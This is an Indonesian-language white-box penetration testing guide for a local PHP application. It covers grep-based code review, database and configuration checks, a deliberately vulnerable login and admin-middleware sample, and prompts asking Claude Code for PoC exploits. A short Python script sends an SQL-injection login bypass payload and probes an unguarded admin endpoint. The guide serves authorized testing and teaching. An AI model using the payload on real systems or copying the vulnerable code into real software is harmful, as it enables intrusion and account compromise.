# Skenario 3: Aplikasi Lokal (10.X.X.X) — White Box

**Akses:** Jaringan lokal / LAN / VM internal  
**Metode:** White Box — akses penuh: source code, database, semua akun, arsitektur  
**Contoh target:** `http://10.10.10.5` + akses SSH/FTP ke server + repository code

---

## Informasi Awal yang Tersedia

| Item | Status |
|------|--------|
| URL / IP target | ✓ |
| Source code | ✓ Lengkap |
| Database schema + dump | ✓ |
| Semua kredensial (admin, DB, SSH) | ✓ |
| Dokumentasi teknis & arsitektur | ✓ |
| Konfigurasi server (nginx, Apache) | ✓ |
| Environment variables / `.env` | ✓ |

---

## Keunggulan White Box

- **Cakupan terluas** — tidak ada yang terlewat
- **Source code review** — temukan vulnerability yang tidak terlihat dari luar
- **Test semua code path** — termasuk fitur tersembunyi
- **Remediasi sangat spesifik** — bisa tunjukkan baris kode yang harus diperbaiki

---

## Phase 1: Source Code Review

### Setup Review di VSCode

```bash
# Clone atau copy source code ke workspace
cp -r /path/to/source /Users/mac/Desktop/pentest-project/whitebox/source/

# Buka di VSCode
code /Users/mac/Desktop/pentest-project/whitebox/source/
```

**Prompt Claude Code — Mass Code Review:**
```
Saya akan melakukan white box pentest. Berikut struktur source code aplikasi PHP:
[PASTE STRUKTUR FOLDER]

Bantu saya review keamanan. Mulai dengan:
1. File mana yang paling kritis untuk direview (authentication, database query, file upload)?
2. Buatkan grep commands untuk cari pola berbahaya:
   - Query tidak ter-parameterisasi
   - eval(), exec(), system() calls
   - $_GET/$_POST langsung ke query
   - md5/sha1 untuk password hashing
   - Hardcoded credentials
```

### Automated Code Scanning

```bash
# PHP — cari pola berbahaya
grep -rn "mysql_query\|mysqli_query" source/ | grep '\$_'
grep -rn "eval\s*(" source/
grep -rn "system\s*(\|exec\s*(\|shell_exec\s*(" source/
grep -rn "include\s*(\$\|require\s*(\$" source/  # LFI risk
grep -rn "md5\s*(\|sha1\s*(" source/             # weak hashing
grep -rn "password\s*=\s*['\"]" source/          # hardcoded pass

# Python/Django
grep -rn "raw\s*(" source/        # Django raw SQL
grep -rn "execute\s*(" source/ | grep "%" # string format in SQL

# JavaScript/Node
grep -rn "eval\s*(" source/
grep -rn "innerHTML\s*=" source/  # XSS risk
```

**Prompt Claude Code — Analisis temuan grep:**
```
Hasil grep pada source code aplikasi di 10.10.10.5:

SQL tanpa parameterisasi:
[GREP OUTPUT]

File include dinamis:
[GREP OUTPUT]

Analisis setiap temuan:
1. Apakah ini benar-benar vulnerable atau false positive?
2. Berikan PoC exploit untuk setiap vulnerability nyata
3. Berikan fix code yang benar
4. Severity: Critical/High/Medium/Low
```

---

## Phase 2: Database Schema Review

```sql
-- Dari database dump yang diberikan, analisis:

-- 1. Cek tabel users — password storage
SELECT column_name, data_type FROM information_schema.columns
WHERE table_name = 'users';

-- 2. Cek apakah ada data sensitif tidak terenkripsi
SELECT * FROM users LIMIT 5;

-- 3. Cek privilege MySQL user
SHOW GRANTS FOR 'app_user'@'localhost';

-- 4. Cek stored procedures berbahaya
SHOW PROCEDURE STATUS WHERE Db = 'app_db';
```

**Prompt Claude Code:**
```
Database schema dari aplikasi white box:
[PASTE SCHEMA / DUMP]

Analisis:
1. Apakah password di-hash dengan algoritma yang kuat? (bcrypt, argon2 > sha1/md5)
2. Apakah ada PII (NIK, nomor HP, email) yang tidak terenkripsi?
3. Apakah MySQL user memiliki privilege berlebihan (SELECT saja atau juga FILE/SUPER)?
4. Apakah ada relasi tabel yang memungkinkan IDOR?
5. Rekomendasikan perbaikan database security
```

---

## Phase 3: Configuration Review

```bash
# Review konfigurasi web server
cat /etc/nginx/sites-enabled/app.conf
cat /etc/apache2/sites-enabled/app.conf

# Review .env / config file
cat source/.env
cat source/config/database.php

# Cek permission file sensitif
ls -la source/.env
ls -la source/config/

# Cek exposed git
ls -la source/.git/

# PHP konfigurasi
php -i | grep -E "display_errors|expose_php|allow_url_include|safe_mode"
```

**Prompt Claude Code:**
```
Konfigurasi server dari white box pentest:

nginx.conf: [ISI]
.env file: [ISI]
php.ini settings: [ISI]

Identifikasi security misconfiguration:
1. Apakah debug mode / display_errors aktif di produksi?
2. Apakah allow_url_include = On (RFI risk)?
3. Apakah ada sensitive data di .env yang seharusnya dirotasi?
4. Apakah HTTPS properly configured?
5. Security headers apa yang missing? (CSP, HSTS, X-Frame-Options)
```

---

## Phase 4: Authentication & Authorization Code Review

```php
// Contoh kode yang ditemukan — paste ke Claude Code untuk review

// auth/login.php
function login($username, $password) {
    $query = "SELECT * FROM users WHERE username='$username' AND password='" . md5($password) . "'";
    $result = mysqli_query($conn, $query);
    if (mysqli_num_rows($result) > 0) {
        $_SESSION['user'] = $username;
        $_SESSION['role'] = mysqli_fetch_assoc($result)['role'];
        return true;
    }
    return false;
}

// Middleware check
function requireAdmin() {
    if ($_SESSION['role'] !== 'admin') {
        header("Location: /login");
        // TIDAK ada exit() setelah redirect!
    }
}
```

**Prompt Claude Code:**
```
Review kode authentication ini dari white box pentest:
[PASTE CODE]

Identifikasi semua vulnerability:
1. SQL Injection — tunjukkan payload exploit
2. Weak password hashing — apa risikonya?
3. Authorization bypass — apakah ada cara bypass middleware?
4. Session management issues
5. Berikan fixed version dari setiap fungsi yang rentan
```

---

## Phase 5: Dynamic Testing Terarah

White box memungkinkan dynamic testing yang sangat terarah berdasarkan code review:

```python
# exploits/whitebox_targeted_test.py
import requests

TARGET = "http://10.10.10.5"

# Dari code review, kita tahu:
# 1. /login.php rentan SQLi
# 2. Tidak ada exit() setelah redirect di admin check

def test_sqli_login():
    """SQLi bypass login — dari code review"""
    payload = {"username": "admin'--", "password": "apapun"}
    resp = requests.post(f"{TARGET}/login.php", data=payload, allow_redirects=False)
    print(f"[SQLi] Status: {resp.status_code}, Location: {resp.headers.get('Location')}")

def test_auth_bypass_no_exit():
    """Admin endpoint tanpa exit() setelah redirect"""
    # Langsung request admin endpoint
    resp = requests.get(f"{TARGET}/admin/users", allow_redirects=False)
    if resp.status_code == 200:
        print(f"[AUTH BYPASS] Admin data accessible! Size: {len(resp.text)}")
    else:
        print(f"[AUTH BYPASS] Status: {resp.status_code}")

test_sqli_login()
test_auth_bypass_no_exit()
```

---

## Phase 6: Laporan White Box

White box menghasilkan laporan paling detail:

**Prompt Claude Code:**
```
Buatkan laporan white box pentest lengkap berdasarkan temuan:

1. SQLi pada auth/login.php baris 5 — parameter username
   File: /var/www/html/auth/login.php
   Code: SELECT * FROM users WHERE username='$username'
   Fix: gunakan prepared statement

2. Weak password hashing — MD5 tanpa salt
   File: /var/www/html/auth/login.php baris 6
   Risk: rainbow table attack
   Fix: gunakan password_hash() dengan PASSWORD_BCRYPT

3. Missing exit() setelah redirect — auth bypass
   File: /var/www/html/middleware/auth.php baris 12

Untuk setiap temuan sertakan:
- Deskripsi teknis dan bisnis
- Lokasi tepat (file:baris)
- CVSS 3.1 score
- PoC code
- Code fix yang benar
```

---

## Checklist White Box Lokal

```
[ ] Setup source code di VSCode
[ ] Automated grep untuk pola berbahaya
[ ] Manual review: authentication code
[ ] Manual review: database query code
[ ] Manual review: file upload handling
[ ] Manual review: input validation
[ ] Database schema review
[ ] Configuration file review (.env, web server config)
[ ] Dynamic testing berdasarkan temuan code review
[ ] Verify semua temuan dengan PoC
[ ] Tulis laporan dengan referensi baris kode
[ ] Berikan rekomendasi fix spesifik (dengan contoh kode)
```
